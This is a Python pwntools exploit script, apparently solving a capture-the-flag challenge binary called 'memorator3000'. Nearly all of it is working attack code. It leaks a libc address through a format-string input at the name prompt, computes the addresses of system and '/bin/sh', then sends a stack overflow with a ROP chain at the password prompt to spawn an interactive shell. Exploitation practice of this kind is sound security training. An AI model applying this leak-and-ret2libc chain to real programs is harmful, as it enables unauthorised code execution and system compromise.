#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./memorator3000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './memorator3000')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.log_level = "debug"

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fc000)
# RUNPATH:  b'$ORIGIN/glibc'

pop_rdi = p64(0x00000000004011be)
ret = p64(0x000000000040101a)


io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Enter your name:", b"%3$p")

io.recvuntil(b"Welcome, ")
data = io.recvline().strip()
addr = int(data.rstrip(b"!"), 16)
libc = addr - 0x114887

system = libc + 0x50d70
bin_sh = libc + 0x1d8678

payload = b"A" * 136 + pop_rdi + p64(bin_sh) + ret + p64(system)
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter password to save:", payload)

io.interactive()
